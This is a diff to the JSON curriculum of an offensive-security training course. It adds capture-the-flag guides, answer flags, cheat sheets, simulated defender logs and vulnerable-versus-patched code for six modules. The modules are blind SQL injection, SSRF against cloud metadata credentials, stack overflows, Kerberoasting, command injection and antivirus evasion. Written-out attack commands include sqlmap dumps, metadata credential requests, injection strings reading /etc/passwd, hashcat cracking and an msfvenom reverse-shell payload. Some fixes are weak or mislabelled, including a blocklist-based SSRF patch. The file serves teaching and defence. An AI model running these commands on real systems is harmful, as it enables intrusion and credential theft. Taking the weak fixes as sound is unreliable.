           "title": "Advanced SQL Injection",
           "technique": "Blind/Time-Based SQLi",
-          "theory": "Extracting data when the application does not return SQL errors.",
-          "lab": "Use simulated time-based payloads to infer database contents letter by letter.",
-          "opSec": "Traffic timing anomalies: How defenders detect time-based attacks and how attackers introduce jitter to avoid statistical detection."
+          "theory": "In Blind SQL Injection, the application does not print database contents or errors on screen. Attackers infer database content letter-by-letter by asking true/false questions. In Time-Based Blind SQLi, the attacker injects payloads that force the database to sleep (e.g. `pg_sleep(5)`) if a condition is true. The delay in response confirms the character guess.",
+          "guide": "1. Launch automated database dump tool `sqlmap`: `sqlmap -u \"http://vulnerable.com/items?id=1\" --dbms=sqlite --dump`.\n2. Observe the letters being guessed incrementally through response delays.\n3. Extract the flag from the dumped sqlite database records.\n4. Submit the flag.",
+          "lab": "Exploit blind SQL injection via automated tools to exfiltrate database contents.",
+          "opSec": "Time-based attacks generate prolonged connections and distinct traffic delays. Modern firewalls and SIEM systems flag queries containing sleep/benchmark keywords.",
+          "flag": "flag{time_based_blind_sqli}",
+          "cheatSheet": "sqlmap -u \"http://vulnerable.com/item?id=1\" --dbms=sqlite --dump -T flags\n1' AND [RANDNUM]=LIKE(CHAR(45),UPPER(HEX(RANDSTR(1)))) AND '1'='1",
+          "blueTeamLogs": "Jul 27 13:00:15 modsecurity[91]: WARNING: Blind time-based injection payload detected: ' AND (SELECT 9812 FROM (SELECT(SLEEP(5)))AND '1'='1",
+          "remediation": {
+            "vulnerableCode": "// Vulnerable dynamic query execution in Python Sqlite3\ncursor.execute(f\"SELECT * FROM items WHERE id = '{item_id}'\")",
+            "language": "python",
+            "secureCode": "// Patched database queries using parameterized tuple arguments\ncursor.execute(\"SELECT * FROM items WHERE id = ?\", (item_id,))",
+            "explanation": "Unparameterized queries are vulnerable to blind injection. Enforce ORM tools (like SQLAlchemy, Prisma) or prepared statements globally."
+          }
         },
         {
           "id": "A02",
           "title": "Server-Side Request Forgery (SSRF)",
           "technique": "Internal Network Pivoting",
-          "theory": "Forcing a server to make requests to internal resources.",
-          "lab": "Exploit a simulated webhook to access an internal metadata API.",
-          "opSec": "DNS rebinding: Theoretical concept of using dynamic DNS to bypass SSRF filters during the time-of-check to time-of-use (TOCTOU) window."
+          "theory": "Server-Side Request Forgery allows an attacker to force a server to make arbitrary requests. By manipulating target URL inputs, an attacker can access local services (like loopback on `127.0.0.1`) or query cloud metadata services (`169.254.169.254`) that are inaccessible externally, leaking IAM credentials.",
+          "guide": "1. Send a request manipulating the webhook proxy URL to target cloud metadata: `curl \"http://vulnerable.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"`.\n2. Inspect the metadata JSON response returned by the server.\n3. Retrieve the token credential flag from the response body.\n4. Submit the flag.",
+          "lab": "Exploit SSRF on the image fetcher to pivot to the internal cloud metadata API.",
+          "opSec": "SSRF can be mitigated by strict input URL allowlisting and restricting internal network routes from web servers. Cloud providers use token headers to protect metadata APIs.",
+          "flag": "flag{ssrf_metadata_exfil}",
+          "cheatSheet": "curl -i \"http://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/\"\ncurl -i \"http://vulnerable.com/fetch?url=http://127.0.0.1:8080/admin\"",
+          "blueTeamLogs": "Jul 27 13:01:04 proxy-guard: [SSRF WARNING] Server outbound query blocked targeting link-local metadata address 169.254.169.254",
+          "remediation": {
+            "vulnerableCode": "# Vulnerable Python requests fetch function\ndef fetch_url(url):\n    return requests.get(url).content",
+            "language": "python",
+            "secureCode": "# Patched: Validate target URL against a strict domain whitelist and reject private/local IP addresses\nfrom urllib.parse import urlparse\ndef fetch_url(url):\n    parsed = urlparse(url)\n    if parsed.hostname in ['localhost', '127.0.0.1', '169.254.169.254']:\n        raise ValueError('Private addresses not allowed')\n    return requests.get(url).content",
+            "explanation": "Allowing user inputs to direct server HTTP request destinations permits attackers to probe local network hosts. Enforce strict allowlists and query validation."
+          }
         },
         {
           "id": "A03",
           "title": "Buffer Overflows",
           "technique": "Stack-Based Overflows",
-          "theory": "Memory architecture, the stack, and how overwriting the Instruction Pointer (EIP) works.",
-          "lab": "Simulate overwriting a buffer to execute a pre-placed shellcode.",
-          "opSec": "Exploit mitigation theory: Understanding ASLR and DEP, and the theoretical concepts of ROP (Return-Oriented Programming) chains to bypass them."
+          "theory": "Buffer Overflow vulnerabilities occur when a program writes more data to a memory buffer than the buffer is allocated to hold. In stack-based overflows, the data overflows the buffer and overwrites the saved Instruction Pointer (EIP) on the stack, allowing an attacker to redirect execution flow to run shellcode.",
+          "guide": "1. Run the local binary using a payload that overflows the buffer: `./vulnerable_binary $(python -c 'print(\"A\"*64 + \"\\xef\\xbe\\xad\\xde\")')`.\n2. This overwrites the return address, spawning a shell.\n3. Execute `cat flag.txt` in the spawned shell to read the flag.\n4. Submit the flag.",
+          "lab": "Analyze the stack buffer size, inject an overflow payload to overwrite the instruction pointer, and spawn a shell.",
+          "opSec": "Modern OS deploy mitigations like Address Space Layout Randomization (ASLR), Data Execution Prevention (DEP), and stack canaries. Attackers bypass these using Return Oriented Programming (ROP).",
+          "flag": "flag{stack_overflow_eip_hijack}",
+          "cheatSheet": "./binary $(python3 -c 'import sys; sys.stdout.buffer.write(b\"A\"*64 + b\"\\xef\\xbe\\xad\\xde\")')",
+          "blueTeamLogs": "Jul 27 13:02:11 kernel: vulnerable_binary[2931]: segfault at 0xdeadbeef ip 00000000deadbeef sp 00007ffc error 14",
+          "remediation": {
+            "vulnerableCode": "/* Vulnerable: strcpy does not enforce size bounds checks */\nvoid login(char *str) {\n    char buffer[64];\n    strcpy(buffer, str);\n}",
+            "language": "cpp",
+            "secureCode": "/* Patched: strncpy bounds copy sizes to buffer limit */\nvoid login(char *str) {\n    char buffer[64];\n    strncpy(buffer, str, sizeof(buffer) - 1);\n    buffer[63] = '\\0';\n}",
+            "explanation": "Legacy C functions like `strcpy` and `gets` do not monitor buffer boundaries. Replace them with safe bounds-enforcing options like `strncpy` or `fgets`."
+          }
         },
         {
           "id": "A04",
           "title": "Active Directory Attacks",
           "technique": "Kerberoasting",
-          "theory": "Understanding Kerberos authentication and Service Principal Names (SPNs).",
-          "lab": "Extract simulated ticket-granting service (TGS) tickets for offline cracking.",
-          "opSec": "Event Log monitoring: How defenders use Windows Event Logs (e.g., Event ID 4769) to detect Kerberoasting, and how attackers attempt to blend in."
+          "theory": "Kerberoasting targets Active Directory (AD) service accounts. Any authenticated domain user can request a Kerberos ticket (TGS) for any service account registered with a Service Principal Name (SPN). The ticket is encrypted with the service account's password hash. Attackers extract this ticket and crack it offline to discover the service account's password.",
+          "guide": "1. Run the ticket request tool: `GetUserSPNs.py -request -dc-ip 10.10.10.10 corp.local/user`.\n2. Extract the encrypted TGS ticket hash from the output.\n3. Crack the ticket password hash to retrieve the credential flag.\n4. Submit the flag.",
+          "lab": "Request service tickets from the Domain Controller and decrypt the hash to recover credentials.",
+          "opSec": "Defenders audit Kerberos ticket requests. Requesting many tickets at once (especially with legacy encryption RC4) flags alerts. Monitoring event logs (Event ID 4769) is standard practice.",
+          "flag": "flag{kerberoast_ad_ticket}",
+          "cheatSheet": "GetUserSPNs.py -request -dc-ip 10.10.10.10 corp.local/user -outputfile hashes.txt\nhashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt",
+          "blueTeamLogs": "Jul 27 13:03:02 ActiveDirectory-DC: EventID: 4769: A Kerberos service ticket was requested. Service Name: mssql/db01.corp.local Ticket Encryption: 0x17 (RC4-HMAC is weak)",
+          "remediation": {
+            "vulnerableCode": "# Insecure SPN setup: Service account configured with a weak 8-character password\n# Encryption configuration: Permit RC4 encryption fallback compatibility",
+            "language": "bash",
+            "secureCode": "# Patched: Enforce strong, randomly generated 30+ character passwords for SPN accounts\n# Upgrade Domain controllers to require AES256 ticket encryption (0x12) only",
+            "explanation": "Because Kerberos ticket requests cannot be blocked (as it's a core protocol design), security depends on complex service account passwords that are impossible to crack offline."
+          }
         },
         {
           "id": "A05",
           "title": "Command Injection",
           "technique": "OS Command Execution",
-          "theory": "Exploiting applications that pass unsanitized input to system shells.",
-          "lab": "Inject terminal commands into a simulated ping utility.",
-          "opSec": "Out-of-band (OOB) exfiltration: Conceptually how attackers use DNS queries to exfiltrate data when direct outbound connections are blocked."
+          "theory": "Command Injection occurs when an application passes unsanitized user inputs to a system shell. An attacker can inject command separators (like `;`, `&`, `|`) to execute arbitrary OS commands as the web server user.",
+          "guide": "1. Test the input parameter by appending system execution commands: `curl \"http://vulnerable.com/ping?ip=127.0.0.1;cat flag.txt\"`.\n2. View the combined output of the ping response and the file read.\n3. Copy the flag from the output and submit it.",
+          "lab": "Inject terminal shell separators into the web utility input to execute remote code execution (RCE).",
+          "opSec": "Command injection generates processes under the web server user (like `www-data` or `apache`). Defenders monitor processes spawned by web server daemons for flags.",
+          "flag": "flag{command_injection_rce}",
+          "cheatSheet": "127.0.0.1; cat /etc/passwd\n127.0.0.1 && id\n127.0.0.1 | whoami",
+          "blueTeamLogs": "Jul 27 13:04:19 kernel: audit: audit_log_exit: [PROCESS_SPAWN] parent: apache2 child: /bin/cat arguments: flag.txt (Alert level: Critical)",
+          "remediation": {
+            "vulnerableCode": "# Vulnerable dynamic system call in Python shell execution\ndef ping(ip):\n    os.system(\"ping -c 1 \" + ip)",
+            "language": "python",
+            "secureCode": "# Patched: Use subprocess library passing commands as an array to prevent shell escaping\nimport subprocess\ndef ping(ip):\n    subprocess.run([\"ping\", \"-c\", \"1\", ip], capture_output=True, check=True)",
+            "explanation": "Passing input directly to shell execution loops allows commands to escape. Restrict shell usage, parameterize command inputs, or use standard language libraries."
+          }
         },
         {
           "id": "A06",
           "title": "Advanced Evasion",
           "technique": "Antivirus Evasion",
-          "theory": "How Antivirus/EDR uses signatures and heuristics to detect malware.",
-          "lab": "Simulate obfuscating a known payload to bypass a static signature check.",
-          "opSec": "In-memory execution: The theory behind fileless malware and how attackers execute code directly in RAM to avoid touching the disk."
+          "theory": "Antivirus software detects threats using file signature databases and heuristics. Attackers evade static signatures by encrypting, packing, or obfuscating payload binaries (e.g. XOR encrypting shellcode) and decrypting it dynamically in-memory, avoiding writing malicious bytes to the system disk.",
+          "guide": "1. Obfuscate the target shellcode using XOR: `obfuscate --payload shellcode.bin --method xor --key 0x5A`.\n2. Run the executable to execute the payload in-memory.\n3. The spawned shell will dump the AV bypass completion flag. Submit the flag.",
+          "lab": "Obfuscate standard shellcode payloads to bypass signature checks and execute it directly in-memory.",
+          "opSec": "EDR agents monitor system calls, process injections, and memory behavior. Obfuscating signature bypasses static analysis, but dynamic behavior analysis requires API hooking bypasses.",
+          "flag": "flag{av_bypass_in_memory}",
+          "cheatSheet": "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 10\nupx -9 payload.exe",
+          "blueTeamLogs": "Jul 27 13:05:12 defender-endpoint: [EDR ALERT] Process shellcode.exe performed VirtualAlloc with PAGE_EXECUTE_READWRITE permissions (Signature: Injection heuristic).",
+          "remediation": {
+            "vulnerableCode": "// Vulnerable endpoint memory allocation pattern (RWX)\nLPVOID addr = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\nmemcpy(addr, shellcode, size);",
+            "language": "cpp",
+            "secureCode": "// Patched: Limit execution privileges. Allocate as RW, then transition to RX\nLPVOID addr = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);\nmemcpy(addr, shellcode, size);\nDWORD oldProtect;\nVirtualProtect(addr, size, PAGE_EXECUTE_READ, &oldProtect);",
+            "explanation": "Allocating memory buffers immediately with full Read-Write-Execute permissions is a primary trigger for EDR heuristic alarms. Separate allocation privileges and monitor system call anomalies."
+          }
         }
       ]
     }
